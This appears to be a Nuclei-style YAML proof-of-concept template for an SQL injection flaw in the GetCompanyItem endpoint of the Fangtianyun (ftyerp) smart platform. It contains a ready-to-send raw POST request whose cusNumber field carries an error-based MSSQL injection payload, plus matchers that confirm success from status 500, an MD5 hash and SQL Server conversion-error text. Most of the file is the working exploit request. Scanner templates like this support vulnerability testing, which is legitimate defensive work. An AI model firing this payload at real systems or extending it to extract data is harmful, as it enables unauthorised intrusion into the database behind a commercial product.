id: poc-yaml-ftyerp-getcompanyitem-sqli
info:
  name: 方天云智慧平台系统 GetCompanyItem SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: ftyerp

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"cusNumber":"1' and 2=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "{{t2}}"
          - "在将 nvarchar 值"
          - "转换成数据类型 int 时失败"
        part: body
